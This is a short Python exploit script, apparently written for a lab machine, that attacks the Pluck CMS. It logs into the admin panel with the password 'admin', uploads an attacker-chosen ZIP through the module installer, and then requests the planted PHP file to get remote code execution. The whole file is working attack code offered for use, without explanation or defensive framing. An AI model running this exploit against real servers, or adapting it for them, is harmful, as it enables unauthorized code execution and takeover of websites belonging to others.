import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://10.129.138.235/login.php"
upload_url = "http://10.129.138.235/pluck/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "admin","bogus": "","submit": "Log in"}

file_path = input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("mirabbas.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")


    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)


    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://10.129.138.235/pluck/data/modules/mirabbas/miri.php"

rce=requests.get(rce_url)

print(rce.text)

